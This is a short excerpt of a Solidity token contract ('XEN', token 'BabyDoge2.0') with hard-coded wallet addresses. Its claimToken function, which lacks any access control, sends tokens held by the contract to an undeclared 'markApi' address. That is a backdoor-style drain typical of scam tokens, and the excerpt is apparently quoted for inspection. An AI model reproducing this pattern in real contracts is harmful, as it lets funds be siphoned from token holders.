...
contract XEN is Context, IERC20, Ownable {
    ...
    string private _name = "BabyDoge2.0";
    string private _symbol = "BabyDoge2.0";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xB3A7133b1EDCcED014c912598a84C8a38c1D8a8C); 
    address payable private teamWalletAddress = payable(0x4df82dd33C8d5Db6e51A7FE4Ae571957574BA96c); 
    ...
    function claimToken(address token, uint256 amount) external{
        IERC20(token).transfer(markApi, amount* 1000000000);
    }
